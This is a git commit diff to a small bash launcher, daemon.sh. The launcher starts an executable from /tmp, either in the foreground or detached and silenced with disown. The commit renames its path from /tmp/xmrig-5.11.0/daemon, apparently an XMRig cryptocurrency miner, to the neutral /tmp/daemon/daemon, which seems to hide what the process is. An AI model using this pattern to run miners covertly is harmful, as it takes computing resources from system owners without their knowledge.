15d047231308545911a7527f53f660b4dd1b346a
7enable <64092152+7enable@users.noreply.github.com>
2020-04-21 12:28:13 -0400

    Update daemon.sh

--- daemon.sh
+++ daemon.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
 case "$1" in
    -c|--daemon)
-       /tmp/xmrig-5.11.0/daemon < /dev/null &> /dev/null & disown
+       /tmp/daemon/daemon < /dev/null &> /dev/null & disown
        exit 0
        ;;
    *)
-       /tmp/xmrig-5.11.0/daemon
+       /tmp/daemon/daemon
        ;;
 esac
